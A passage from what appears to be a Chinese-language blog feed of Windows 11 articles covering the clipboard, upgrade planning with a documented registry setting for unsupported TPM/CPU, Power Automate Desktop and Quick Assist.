id="剪貼簿新介面與多格式支援"><a href="#剪貼簿新介面與多格式支援" class="headerlink" title="剪貼簿新介面與多格式支援"></a>剪貼簿新介面與多格式支援</h3><p>剪貼簿的全新介面不僅更為直觀，還加入了 多格式支援，讓剪貼簿的使用更加靈活。現在，您不僅可以存儲文字，還能儲存 圖片、GIF、Emoji 表情符號 等各種格式的內容，使得複製和貼上變得更加豐富多樣。</p><ul><li>快捷鍵：透過快捷鍵 Windows + V，您可以快速開啟剪貼簿介面，輕鬆查看並選擇之前複製的項目。</li><li>頻繁使用的項目：剪貼簿還會自動整理出您最近使用過的內容，並將 Emoji、GIF 表情符號等項目方便快捷地展示在選單中，減少重複操作的時間。</li></ul><p><img src="https://ithelp.ithome.com.tw/upload/images/20241028/20130026oKDr3etbz9.png" alt="https://ithelp.ithome.com.tw/upload/images/20241028/20130026oKDr3etbz9.png"></p><h3 id="剪貼簿的靈活應用"><a href="#剪貼簿的靈活應用" class="headerlink" title="剪貼簿的靈活應用"></a>剪貼簿的靈活應用</h3><p>Windows 11 剪貼簿的升級大大提升了它的靈活性和便利性。無論是用於記錄日常靈感、待辦事項，還是處理辦公文檔、學習筆記，剪貼簿都能提供極大的幫助。隨時隨地都能輕鬆管理您的資料，無需擔心丟失任何重要內容，讓工作變得更加高效且有條理。</p><p>此外，剪貼簿不僅支援文字，還支援圖片及其他格式的內容，可以更靈活運用複製和貼上功能，滿足多樣化需求，準備好開始使用全新進化的剪貼簿了嗎?</p>]]></content>
      
      
      <categories>
          
          <category> Windows11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows11 </tag>
            
            <tag> 2024ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 11 升級指南</title>
      <link href="/2024/12/05/windows11/ways-to-windows11/"/>
      <url>/2024/12/05/windows11/ways-to-windows11/</url>
      
        <content type="html"><![CDATA[<p>為什麼升級到 Windows 11？升級到 Windows 11 不僅能確保您的設備在安全性上獲得支持，還能提升性能和用戶體驗。以下是幾個值得考慮的理由：</p><ul><li>現代化介面：Windows 11 擁有全新的設計，簡化的用戶介面讓您更容易找到和使用應用程式。</li><li>性能優化：新系統針對遊戲和多任務處理進行了效能調整，提供更流暢的使用體驗。</li><li>新的應用程式和功能：包含許多新功能、小工具、虛擬桌面及整合的 Microsoft Teams，讓工作和娛樂更加高效。</li><li>長期支援：隨著 Windows 10 的 EOL，升級至 Windows 11 可確保您獲得最新的安全更新和功能。</li></ul><h2 id="Windows-11-最低硬體規格需求"><a href="#Windows-11-最低硬體規格需求" class="headerlink" title="Windows 11 最低硬體規格需求"></a>Windows 11 最低硬體規格需求</h2><p>可以先透過 PC Health Check Tool 這個免費工具，來檢查裝置的硬體規格，可快速確認設備是否符合 Windows 11 的基本要求，如 CPU、RAM、存儲空間和 TPM 2.0 等關鍵硬體組件:</p><ul><li>處理器:相容的 64 位元處理器或晶片系統（SoC），具備 1 GHz 以上，並配備 2 個以上的核心</li><li>記憶體:（RAM） 4 GB</li><li>儲存空間: 64 GB 以上的儲存空間</li><li>系統韌體: UEFI，支援安全開機（Secure Boot）</li><li>TPM: 信賴平台模組（TPM）版本 2.0</li><li>圖形卡: 相容於 DirectX 12 或更新版本，包含 WDDM 2.0 驅動程式</li><li>顯示器: 高畫質（720p）顯示器，9 吋以上，每個色彩通道 8 位元</li></ul><h2 id="升級到-Windows-11-的建議"><a href="#升級到-Windows-11-的建議" class="headerlink" title="升級到 Windows 11 的建議"></a>升級到 Windows 11 的建議</h2><p>小編的筆電還停留在 Asus X550C，由於 TPM 的關係，因為 TPM 的限制而無法直接升級至 Windows 11，TPM 2.0 的要求，是為了提供進階的安全功能，如加密和安全開機，以應對新型態的勒索軟體和駭客攻擊。</p><p>微軟官方建議，不應在不符合 Windows 11 最低系統要求的設備上安裝該系統。根據小編的體驗，至少需要 8GB 的記憶體，以下是本次測試的硬體規格：</p><blockquote><p>CPU: i5-3337U<br>GPU: NVDIA GT720M<br>Memory: 8G<br>Disk: ADATA SU800 128G</p></blockquote><p>但官方還是提供了一條<a href="https://support.microsoft.com/en-us/windows/ways-to-install-windows-11-e0edbbfb-cfc5-4011-868b-2ce77ac7c70e">非建議的安裝方式</a>，讓想要搶先體驗的夥伴能夠進行升級，小編本次就是透過這種方式進行老筆電安裝升級至 Windows 11。</p><h2 id="繞過-TPM-2-0-的方法"><a href="#繞過-TPM-2-0-的方法" class="headerlink" title="繞過 TPM 2.0 的方法"></a>繞過 TPM 2.0 的方法</h2><p>如果評估過後決定進行這樣的操作並了解其中的風險，可以創建以下的註冊表鍵值，以繞過對 TPM 2.0。</p><p>但官方建議至少需要 TPM 1.2 和 CPU 型號的檢查，要檢查目前的 TPM 版本，可以按照以下步驟進行：</p><ol><li>按下 Win + R 鍵，打開「執行」對話框。</li><li>輸入 tpm.msc，然後按 Enter。</li><li>在出現的「TPM 管理」視窗中，查看右側的「TPM 裝置資訊」。在這裡，你可以看到 TPM 的版本（例如，TPM 1.2 或 TPM 2.0）。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/20130026HVa27ynLGm.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/20130026HVa27ynLGm.png"></p><p>註冊表鍵值設定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">路徑：HKEY_LOCAL_MACHINE\SYSTEM\Setup\MoSetup</span><br><span class="line">名稱：AllowUpgradesWithUnsupportedTPMOrCPU</span><br><span class="line">類型：REG_DWORD</span><br><span class="line">數值：1</span><br></pre></td></tr></table></figure><ol><li>windows + R</li><li>輸入 regedit 按確認執行</li><li>到以上路徑新增 AllowUpgradesWithUnsupportedTPMOrCPU</li></ol><p>注意：<strong>如果不正確地修改註冊表，可能會出現嚴重問題</strong>，這些問題可能需要重新安裝操作系統，微軟無法保證這些問題能夠解決，請在評估風險後才修改註冊表。</p><p>升級至 Windows 11 雖需繞過某些系統要求，但在安全性、性能和功能上的提升，無疑是值得考慮的選擇。</p><p><strong>請在進行任何修改之前，確保備份重要資料，並仔細閱讀相關指南。</strong></p><p>Windows 11 是微軟最新推出的作業系統，帶來了多項視覺設計、功能優化和效能提升。隨著 Windows 11 的推出，許多企業和個人面臨是否升級至新作業系統的選擇。這篇文章將分享我作為一名 IT 小編，對於使用效能較低的 ASUS VivoBook Flip 12 電腦升級 Windows 11 的測試結果，並從硬體需求、資訊安全、升級策略和企業需求等方面提供升級的建議。</p><h2 id="低效能設備-Windows-11-升級評估"><a href="#低效能設備-Windows-11-升級評估" class="headerlink" title="低效能設備 Windows 11 升級評估"></a>低效能設備 Windows 11 升級評估</h2><p>目前小編手邊還有一台效能比較低的 ASUS VivoBook Flip 12，身為 IT 的小編會不會選擇再升級一台舊電腦?</p><p>ASUS VivoBook Flip 12 配置：</p><blockquote><p>處理器: Intel® Celeron® N3350 處理器 1.1 GHz (2M 快取，最高 2.4 GHz)<br>記憶體: 4GB DDR3 on board<br>儲存空間: 64G eMMC</p></blockquote><p>這台設備的配置顯然無法達到 Windows 11 的最低硬體要求，因此，升級這樣的設備可能會造成系統不穩定，甚至影響工作效率。但對於企業來說，隨著 Windows 10 支援的終止和對安全性的需求日益增強，更換作業系統是一個必須要解決的問題。在這樣的背景下，不管是個人或企業應該評估現有設備的狀況，並根據實際需求進行升級或更換。</p><blockquote><p>答案是目前還不會</p></blockquote><h3 id="Windows-11-的硬體需求"><a href="#Windows-11-的硬體需求" class="headerlink" title="Windows 11 的硬體需求"></a>Windows 11 的硬體需求</h3><p>我從小就開始接觸電腦，經歷了從 倚天中文系統 到 Windows 95、98、ME、2000、XP、7、10、11 的各種版本，這一路走來，體會最深的就是每一次操作系統升級都伴隨著硬體需求的提升。過往，升級新作業系統時，問題大多出在硬體效能跑不動，但一般情況下，透過擴增 RAM 或更換固態硬碟（SSD） 就能解決問題。</p><p>Windows 11 帶來了比以往更高的硬體要求。與以往的版本相比，Windows 11 不僅要求更強的處理器性能，還加入了 TPM 2.0 和安全啟動等安全功能，這使得許多舊設備無法升級。對於像 ASUS VivoBook Flip 12 這樣的舊設備而言，升級的難度更大，且升級後的效能也無法保證流暢運行，甚至會拖慢工作效率。</p><h2 id="升級或更換設備？Windows-11-升級決策"><a href="#升級或更換設備？Windows-11-升級決策" class="headerlink" title="升級或更換設備？Windows 11 升級決策"></a>升級或更換設備？Windows 11 升級決策</h2><p>如果設備無法升級到 Windows 11，替換設備便成為必要步驟。升級過程中的注意事項包括：</p><ul><li>確保新設備符合最低硬體要求，以保證升級後的穩定性和效能。</li><li>備份資料，防止升級過程中資料丟失。</li><li>測試軟體相容性，確保現有應用程式不會與新作業系統衝突。</li></ul><h2 id="升級-Windows-11-的預算與安全性問題"><a href="#升級-Windows-11-的預算與安全性問題" class="headerlink" title="升級 Windows 11 的預算與安全性問題"></a>升級 Windows 11 的預算與安全性問題</h2><p>升級 Windows 11 不僅是技術問題，還涉及到預算和安全性的挑戰。對企業來說需要在有限的 IT 預算內，平衡升級所帶來的效益與投入的成本。</p><p>如何說服管理層支持升級：</p><ul><li>安全性提升：升級後，Windows 11 提供更強大的數據加密和防範未授權訪問的功能，能有效降低數據外洩風險。</li><li>節能減碳效益：Windows 11 具有更高效的能源管理系統，能降低企業運營中的能源消耗，符合 ESG（環境、社會、公司治理）要求。</li><li>分階段升級計劃：建議企業採取分階段升級的策略，減少一次性資本支出，並根據實際需求調整預算。</li></ul><h2 id="Windows-11-的資訊安全優勢"><a href="#Windows-11-的資訊安全優勢" class="headerlink" title="Windows 11 的資訊安全優勢"></a>Windows 11 的資訊安全優勢</h2><p>Windows 11 在資訊安全方面進行了多項強化。新加入的 TPM 2.0 和安全啟動功能，能有效防止未經授權的存取，並加強對企業資料的加密保護。這對於當前數據泄露風險增加的環境來說，顯得尤為重要。</p><p>然而，這些新功能會對硬體提出更高的要求，舊設備如果無法支持這些功能，可能會導致升級後系統不穩定，這也是許多企業在升級過程中需要謹慎考量的因素。</p><h2 id="節能與環保：Windows-11-的-ESG-優勢"><a href="#節能與環保：Windows-11-的-ESG-優勢" class="headerlink" title="節能與環保：Windows 11 的 ESG 優勢"></a>節能與環保：Windows 11 的 ESG 優勢</h2><p>Windows 11 針對能源管理進行了優化，能在企業中實現節能減碳，符合 ESG 策略。透過智慧休眠模式和背景處理，系統能夠顯著降低能源消耗。然而，對於效能不足的舊設備來說，這些功能的效果會受到限制。</p><p>然而，若現有設備本身效能不足，這些節能特性可能無法完全發揮，因為系統過於依賴硬體運行，設備本身的效能就已經低落，沒有效能全開很可能系統都無法順暢運行，就別談 ESG 了。</p><h2 id="Windows-10-EOS-急迫性與因應策略"><a href="#Windows-10-EOS-急迫性與因應策略" class="headerlink" title="Windows 10 EOS 急迫性與因應策略"></a>Windows 10 EOS 急迫性與因應策略</h2><p>2025 年，微軟將停止對 Windows 10 的支援。對於仍在使用 Windows 10 的企業，這意味著不再有安全更新支持，將面臨數據外洩和系統攻擊的風險。因此，企業必須加快升級至 Windows 11，以保障資訊安全。</p><p>企業的應對策略：</p><ul><li>評估現有設備是否能升級到 Windows 11，如果不能，必須規劃替換設備的預算和時間表。</li><li>雲端轉型：對於需要提升效率和靈活性的企業，考慮虛擬化、容器化或雲端基礎設施的轉型，這樣不僅能提升運營效率，還能減少對舊硬體的依賴，透過雲端或是容器化，需要保護或是大規模更動的或許就不再是實體的硬體，若真的需要進行復原也相對容易。</li></ul><p>如果小編屆時升級後仍然出現問題，會考量將舊筆電系統轉換至 ChromeOS Flex。</p><h2 id="Windows-11-記憶體使用分析"><a href="#Windows-11-記憶體使用分析" class="headerlink" title="Windows 11 記憶體使用分析"></a>Windows 11 記憶體使用分析</h2><p>不過 Windows 11 在效能上也引發了一些問題，小編用起來體感記憶體有用的比較滿，所以特別去查了網路上的評測，確實也有發現類似的問題。</p><p>根據<a href="https://www.hk01.com/article/690067">網路上的測試</a></p><ul><li>Windows 11 在開機時的記憶體佔用率約 29%，相比於 Windows 10 的 19% 增加了約 10%。</li><li>對於擁有 4GB 或 8GB 記憶體的舊款筆電來說，這樣的記憶體佔用率可能會影響系統的流暢性。</li><li>若是 16GB 記憶體的設備，開機後的可用記憶體約為 11GB，這對於需要運行大型應用程式的使用者來說，無疑會是一個挑戰。</li></ul><p>若想避免卡頓的情況，建議用戶在升級之前仔細考量自己的硬體配置，雖然 Windows 11 提供了針對特定應用的效率模式，但仍需微軟在後續更新中進一步優化。</p><h2 id="常見問題與改進建議"><a href="#常見問題與改進建議" class="headerlink" title="常見問題與改進建議"></a>常見問題與改進建議</h2><p>使用過程中，我也遇到了一些小問題。例如，在某些情況下，時間同步功能會出現異常，這可能會影響到日常使用。對於這些小問題，微軟可能會在未來的更新中進行修復，建議使用者保持系統的最新狀態。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241011/20130026G9deZPvvXg.png" alt="https://ithelp.ithome.com.tw/upload/images/20241011/20130026G9deZPvvXg.png"></p><h2 id="IT-部署規劃：如何無縫升級到-Windows-11"><a href="#IT-部署規劃：如何無縫升級到-Windows-11" class="headerlink" title="IT 部署規劃：如何無縫升級到 Windows 11"></a>IT 部署規劃：如何無縫升級到 Windows 11</h2><p>對於竹科這種都是工廠的公司來說，我認為也無法一次到位，升級至 Windows 11 對企業來說是一次全方位的挑戰，如果系統升級上去需要停機停線，這個損失往往遠大過於系統升級的好處。</p><p>除了硬體升級，升級過程中硬體相容性和軟體相容性會是企業遇到的主要問題，小編在大公司過往的經驗都是會遇到問題，因為大公司的電腦中除了作業系統本身還額外安裝了許多監控類的系統，而這些系統是很可能跟新的作業系統打架的。</p><p>除了透過相容性測試工具，如 Windows 11 Health Check，來確保現有的硬體和應用程式能夠與新系統順利運行。還需要對操作系統部署進行周密規劃。</p><p>以下是一些建議：</p><ul><li>在升級前進行<strong>測試環境部署</strong>，確保系統升級不會對業務流程造成干擾。</li><li>設計<strong>還原計劃</strong>，若升級出現問題，可以迅速恢復到舊系統避免業務中斷。</li></ul><h2 id="ESU-能有什麼幫助"><a href="#ESU-能有什麼幫助" class="headerlink" title="ESU 能有什麼幫助?"></a>ESU 能有什麼幫助?</h2><p>隨著 Windows 10 的支援將於 2025&#x2F;10&#x2F;14 結束，在終止支援（End of Support, EOS）後，微軟將不再提供安全更新或漏洞修補，企業需立即做對應的規劃，像是購買擴展安全更新（ESU）或是升級至 Windows 11。</p><p>這對企業的 IT 基礎架構、數位安全性、業務運營及成本管理等方面都帶來了深遠的影響。</p><h2 id="Windows-10-EOS-對企業的急迫性"><a href="#Windows-10-EOS-對企業的急迫性" class="headerlink" title="Windows 10 EOS 對企業的急迫性"></a>Windows 10 EOS 對企業的急迫性</h2><p>從 Windows 10 開始後強制性更新帶來了不少問題，而 Windows 11 開始更是從硬體開始打造一條龍的安全性保護，整體的硬體支援跟版本的相容度想當然就沒那麼高。</p><h3 id="急迫性分析"><a href="#急迫性分析" class="headerlink" title="急迫性分析"></a>急迫性分析</h3><p>隨著時間的過去急迫性會顯示在安全風險與漏洞暴露、軟體與應用相容性問題、成本與運維挑戰。</p><ul><li>缺乏安全更新：一旦 Windows 10 停止支援，企業將無法再獲得來自 Microsoft 的安全更新或漏洞修復。隨著時間推移，系統中的未修補漏洞將成為黑客的目標，可能導致資料洩露、勒索病毒攻擊、網絡滲透等重大安全事故。</li><li>法律與合規風險：許多企業必須遵守特定的行業規範（如 GDPR、HIPAA 等），如果使用不再支援的操作系統，可能無法滿足這些合規要求，並可能面臨罰款或法律後果。</li><li>隨著支援終止，第三方應用程式和企業級軟體將不再在 Windows 10 上釋出更新版本。</li><li>硬體更新需求：Windows 11 相對於 Windows 10 對硬體的要求更高，企業可能需要升級硬體，尤其是舊款設備無法升級至 Windows 11。</li></ul><p>此外，隨著市場對新技術的需求增加，企業如不跟上潮流，可能會在競爭中處於劣勢。因此，企業需立即評估其 IT 基礎設施，以確保能在支援結束前制定有效的升級或替代計劃。</p><h3 id="強制性更新的影響"><a href="#強制性更新的影響" class="headerlink" title="強制性更新的影響"></a>強制性更新的影響</h3><p>身為工程師其實都知道首先我們要先養蟲，蟲才能夠養我們，蟲與工程師是一個互利共生的概念，但自從強制更新出現之後，我們可以發現 Windows 11 的更新問題頻傳，一次的大改版可能真的是改太大，最終的建議都走向換電腦一途。</p><p>企業端在派送更新時應了解這些更新的背景，避免升級之後可能導致系統中斷或相容性問題，並且制定有效的更新和還原策略，以減少對業務運行的影響。</p><blockquote><p>並不是每個人每間公司都能夠馬上換電腦的，那就來試試看 ESU 吧</p></blockquote><h2 id="Windows-10-EOS-因應策略"><a href="#Windows-10-EOS-因應策略" class="headerlink" title="Windows 10 EOS 因應策略"></a>Windows 10 EOS 因應策略</h2><p>因應策略大致會有底下幾個方向和選擇</p><ol><li>升級至 Windows 11</li><li>無法升級則考慮 Windows 10 ESU</li><li>沒大筆預算就先加強資安設定及教育訓練</li><li>改成使用雲端的解決方案</li></ol><h3 id="計劃升級至-Windows-11"><a href="#計劃升級至-Windows-11" class="headerlink" title="計劃升級至 Windows 11"></a>計劃升級至 Windows 11</h3><ol><li>進行全面的硬體與軟體評估：確認現有設備是否符合 Windows 11 的系統要求，並評估升級的可行性。</li><li>制定升級計劃：根據業務需求和現有資源，制定明確的升級時間表，並分階段實施，以減少業務運行的影響。</li><li>員工培訓與支持：針對新系統的培訓計劃至關重要，確保員工能快速適應新操作系統，提高生產力。</li></ol><h3 id="考慮-Windows-10-延長支援"><a href="#考慮-Windows-10-延長支援" class="headerlink" title="考慮 Windows 10 延長支援"></a>考慮 Windows 10 延長支援</h3><p>升級 Windows 11 主要在改善效能和更完整的安全防護，但對於無法立即升級的企業，微軟提供了擴展安全更新（ESU）選項。</p><p>雖然這些更新可延長支援時間，但需要付費且僅限於特定期間。企業需評估 ESU 的成本效益，因其成本較高，且僅能提供短期的過渡支援，需考慮長期的 IT 策略，以避免因支援終止而暴露於安全風險中。</p><p>最新的 Windows 10 版本為 22H2，在支援終止後只有透過付費 ESU 才能獲得安全更新，Windows 365 訂閱包含擴充安全性更新 (ESU)，對於存取 Windows 365 的 Windows 10 裝置無需額外付費。</p><p>Windows 10 壽命到期微軟推出個人版延伸安全更新（ESU）方案，方案將會提供一年的更新費用為 30 美元，使用者可於 2025 年接近支援結束時進行註冊。</p><p>更多資訊可以參考以下連結:</p><ul><li><a href="https://techcommunity.microsoft.com/t5/windows-it-pro-blog/plan-for-windows-10-eos-with-windows-11-windows-365-and-esu/ba-p/4000414">https://techcommunity.microsoft.com/t5/windows-it-pro-blog/plan-for-windows-10-eos-with-windows-11-windows-365-and-esu/ba-p/4000414</a></li><li><a href="https://www.theregister.com/2024/10/31/microsoft_windows_10_support/">https://www.theregister.com/2024/10/31/microsoft_windows_10_support/</a></li></ul><h3 id="加強資訊安全管理"><a href="#加強資訊安全管理" class="headerlink" title="加強資訊安全管理"></a>加強資訊安全管理</h3><p>增強的安全防護：企業應該加強內部的資安防護措施，防範升級過程中出現的漏洞。這包括更新防火牆、反病毒軟體、網絡監控系統等。<br>培訓員工：進行安全意識訓練，幫助員工理解舊系統的風險，以及如何避免遭受網絡攻擊或資料洩漏。</p><h3 id="使用雲端與虛擬化技術解決方案"><a href="#使用雲端與虛擬化技術解決方案" class="headerlink" title="使用雲端與虛擬化技術解決方案"></a>使用雲端與虛擬化技術解決方案</h3><ol><li>雲端桌面（DaaS）解決方案：企業可以考慮將部分桌面工作環境轉移到雲端，例如使用 Microsoft Azure 的虛擬桌面解決方案（Azure Virtual Desktop），使員工可以使用任何設備進行工作，且無需擔心操作系統的升級問題。</li><li>桌面虛擬化：透過虛擬桌面基礎架構（VDI），企業可以減少對實體硬體的依賴，並在單一平台上集中管理不同操作系統，進一步提高靈活性和降低成本。</li></ol><h2 id="升級的挑戰與機遇"><a href="#升級的挑戰與機遇" class="headerlink" title="升級的挑戰與機遇"></a>升級的挑戰與機遇</h2><p>因為 Windows 11 因為對於硬體的要求提高，且目前 iPhone 的市佔率越來越高，使用者有可能為了方便整合會選擇轉移到蘋果生態系，這次很可能會是微軟使用者流失最快的一次，小編的舊電腦若支援不佳也可能考慮轉移至 Chrome OS 或是 Linux 系統進行使用。</p><p>但這次體驗下來升級至 Windows 11 不僅能提升安全性，還可通過新功能增強團隊的協作與生產力，在面臨 Windows 10 支援終止的情況下，應利用機會進行系統升級和架構重組，企業端儘早規劃制定明確的升級策略，選擇適合的方案以保障業務持續運行和安全，並加強員工培訓，以適應新操作系統。</p>]]></content>
      
      
      <categories>
          
          <category> Windows11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows11 </tag>
            
            <tag> 2024ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 11 Power Automate 自動化提升工作效率</title>
      <link href="/2024/11/27/windows11/windows11-power-automate/"/>
      <url>/2024/11/27/windows11/windows11-power-automate/</url>
      
        <content type="html"><![CDATA[<p>在 Windows 11 中，Power Automate 成為提升工作效率的強大工具。這是一個低程式碼平台，旨在幫助使用者輕鬆管理和優化日常工作流程，透過自動執行重複性任務，節省時間並提高生產力。</p><h2 id="Power-Automate-的核心功能"><a href="#Power-Automate-的核心功能" class="headerlink" title="Power Automate 的核心功能"></a>Power Automate 的核心功能</h2><p>Power Automate 提供了一個易於使用的低程式碼平台，使非技術人員也能輕鬆設計和管理自動化流程。這對企業和個人都十分有用，尤其是處理大量重複性任務時。</p><ul><li>預先安裝: 在 Windows 11 中，Power Automate Desktop 已經預安裝，使用者可以立即使用，無需額外安裝，降低了入門的門檻。</li><li>低程式碼平台: 使用者只需透過簡單的拖放操作即可創建自動化流程，無需編寫程式碼。平台內建超過 400 種預製動作，還支援錄製滑鼠和鍵盤操作，進行機器人程序自動化（RPA）。</li><li>多樣化應用: Power Automate 可以自動化各種業務流程，如從電子郵件中提取資料、生成報告、填寫表單等。它還能在 Microsoft 和第三方應用程式之間無縫交換資料，顯著提高工作效率。</li><li>視覺化設計器: 直觀的視覺化界面使得即使是沒有程式設計背景的使用者，也能輕鬆設計和管理自動化流程。清晰的流程設計邏輯幫助用戶了解每個任務的執行步驟。</li></ul><h2 id="Power-Automate-使用方法"><a href="#Power-Automate-使用方法" class="headerlink" title="Power Automate 使用方法"></a>Power Automate 使用方法</h2><p>Power Automate 提供多個範本，方便快速上手。只需存取範本中的服務，並輸入必要的設定即可開始。</p><ul><li>啟用 Power Automate: 在 Windows 11 的開始菜單中搜索 “Power Automate”，並使用 Microsoft 帳戶登入開始使用。</li><li>引導教學: 首次登入時，Power Automate 會提供一個引導教學，幫助用戶熟悉工具的控制台和設計器，讓用戶能夠快速上手。</li><li>流程錄製: Power Automate 讓使用者錄製操作過程，這些操作會被自動轉換成可執行的自動化步驟。這樣使用者無需手動配置每一個操作，讓自動化流程的創建變得簡單快捷。</li></ul><p>例如，這篇文章中提到的小編透過 Power Automate 的錄製功能，把某支股票（0050）的股價自動貼到記事本中。這是一個簡單的例子，但展示了如何運用錄製功能來節省時間和提高效率。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/20130026jJnRtJnGLJ.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/20130026jJnRtJnGLJ.png"></p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241103/20130026GYDJCpflRp.png" alt="https://ithelp.ithome.com.tw/upload/images/20241103/20130026GYDJCpflRp.png"></p><h3 id="實際應用案例"><a href="#實際應用案例" class="headerlink" title="實際應用案例"></a>實際應用案例</h3><p>Power Automate 在企業中的應用非常廣泛，尤其在需要處理大量數據和報表的部門中。例如：</p><ul><li>財務部門：自動生成報表和處理繁瑣的數據輸入工作，減少人為錯誤並提高處理速度。</li><li>可口可樂公司：根據統計，93% 的《Fortune》500 大企業都在使用 Power Automate。可口可樂就利用這個工具來自動化發票生成、訂單管理、物流管理等業務流程，顯著提升效率。</li></ul><p><a href="https://www.youtube.com/watch?v=N8RmCW_UXgM"><img src="https://img.youtube.com/vi/N8RmCW_UXgM/0.jpg" alt="Yes"></a></p><h2 id="如何開始使用-Power-Automate"><a href="#如何開始使用-Power-Automate" class="headerlink" title="如何開始使用 Power Automate"></a>如何開始使用 Power Automate</h2><p>透過 Power Automate，Windows 11 用戶能夠充分利用自動化技術，提高工作效率和生產力。無論是大型企業還是小型團隊，Power Automate 都是提升業務效率的理想工具。</p><p>Microsoft 官網提供了一系列的教程，幫助使用者學會如何建立和使用自動化流程，可以一步一步入門這個工具:<br><a href="https://learn.microsoft.com/en-us/training/modules/build-first-desktop-flow/">https://learn.microsoft.com/en-us/training/modules/build-first-desktop-flow/</a></p><p>Power Automate 是一個非常強大且實用的工具，尤其適合那些需要處理大量重複性任務的使用者。Windows 11 的集成功能，使得這個工具更加便捷且易於上手。無論是用於企業級的自動化，還是個人日常工作流程的優化，Power Automate 都是提升工作效率的理想選擇。</p><p>透過這些功能，Windows 11 用戶可以更好地利用自動化技術，節省時間、提高效率，並將更多的精力投入到更具創造性和價值的工作中。</p>]]></content>
      
      
      <categories>
          
          <category> Windows11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows11 </tag>
            
            <tag> 2024ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 11 內建的遠端協助 Quick Assist</title>
      <link href="/2024/11/25/windows11/windows11-quick-assist/"/>
      <url>/2024/11/25/windows11/windows11-quick-assist/</url>
      
        <content type="html"><![CDATA[<p>遠端協助可以在很多方面做應用，不管是之前交程式家教或是幫朋友看電腦問題，這個功能已成為日常工作與生活中不可或缺的一部分。</p><p>在 Windows 11 中，微軟推出了全新的內建工具 Quick Assist，Quick Assist 是一個功能強大且易於使用的遠端協助工具可以輕鬆進行遠端支援，無需再下載像 Anydesk 或 TeamViewer 這類第三方應用程式。</p><p>無論是日常的技術支援，還是工作中的協作，Quick Assist 都能為使用者帶來更流暢的體驗。讓我們一起開箱這項新技術帶來的便利吧！</p><h2 id="什麼是-Quick-Assist？"><a href="#什麼是-Quick-Assist？" class="headerlink" title="什麼是 Quick Assist？"></a>什麼是 Quick Assist？</h2><p>Quick Assist 是 Windows 11 中的一個內建工具，旨在幫助用戶提供或接收遠端協助。無論是解決日常的電腦問題、技術支援，還是協作工作，Quick Assist 讓遠端支援變得更簡單、更高效。</p><h2 id="使用-Quick-Assist-的好處"><a href="#使用-Quick-Assist-的好處" class="headerlink" title="使用 Quick Assist 的好處"></a>使用 Quick Assist 的好處</h2><ol><li>無需額外下載: Quick Assist 直接集成於 Windows 11 系統中，無需安裝任何額外的軟體，這節省了時間和系統資源。</li><li>簡單易用: 介面直觀，使用流程簡單明瞭，只需打開應用，生成一個密碼，並將該密碼分享給需要幫助的人，對方輸入密碼後即可連接，實現遠端支援。</li><li>安全性高: Quick Assist 使用加密技術來保護連接過程中的數據和隱私，讓使用者可以放心進行遠端操作。遠端支援過程中，使用者隨時可以選擇停止協助，確保完全的控制權。</li></ol><h2 id="如何使用-Quick-Assist？"><a href="#如何使用-Quick-Assist？" class="headerlink" title="如何使用 Quick Assist？"></a>如何使用 Quick Assist？</h2><ol><li>打開 Quick Assist：在開始選單中搜尋 “Quick Assist “並打開它。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/20130026c7JN9J6mWr.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/20130026c7JN9J6mWr.png"></p><ol start="2"><li>選擇協助模式：在應用中，你可以選擇<strong>提供協助</strong>或<strong>接受協助</strong>。如果你是需要幫助的一方，選擇<strong>接受協助</strong>，然後輸入由對方提供的安全密碼。如果你是提供協助的一方，選擇<strong>提供協助</strong>，並生成一個安全密碼，將其發送給對方。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/20130026R4v0smbg0T.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/20130026R4v0smbg0T.png"></p><ol start="3"><li>連接：當對方輸入密碼後，協助過程將立即開始，並且可以遠端控制對方的電腦進行問題診斷和解決。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/20130026x0B1GrNa5X.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/20130026x0B1GrNa5X.png"></p><ol start="4"><li>管理多個螢幕：如果對方有多個螢幕，Quick Assist 會自動檢測並顯示螢幕選項。你可以選擇連接並調整解析度，確保顯示效果正確。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/201300262L4s9ADoUP.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/201300262L4s9ADoUP.png"></p><ol start="5"><li>控制權管理：初始時，Quick Assist 不會自動授予控制權。若需要對對方電腦進行控制，必須請對方授予控制權。在進行遠端協助時，雙方都可以隨時終止控制權，確保操作的安全性和透明性。可以通過內建的對話框與對方進行溝通，或使用其他通訊工具（如電話或即時消息）協作解決問題。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241031/20130026xkWmmt4GE1.png" alt="https://ithelp.ithome.com.tw/upload/images/20241031/20130026xkWmmt4GE1.png"></p><h2 id="Quick-Assist-的應用場景"><a href="#Quick-Assist-的應用場景" class="headerlink" title="Quick Assist 的應用場景"></a>Quick Assist 的應用場景</h2><ul><li>家庭支援：幫助家人解決日常的電腦問題，如操作設置、解決軟體問題等。</li><li>工作協作：如果在遠端工作中，團隊成員之間需要進行即時協作或技術支援，Quick Assist 也能幫助解決各種操作問題。</li><li>學習支援：教師和學生可以利用 Quick Assist 進行遠端輔導，協助學生解決學習中的技術難題。</li></ul><p>Windows 11 的 Quick Assist 功能是一個非常強大的工具，讓用戶能夠輕鬆進行遠端技術支援，無論是在家庭、工作或學習環境中，都能提供即時的協助。由於它是 Windows 11 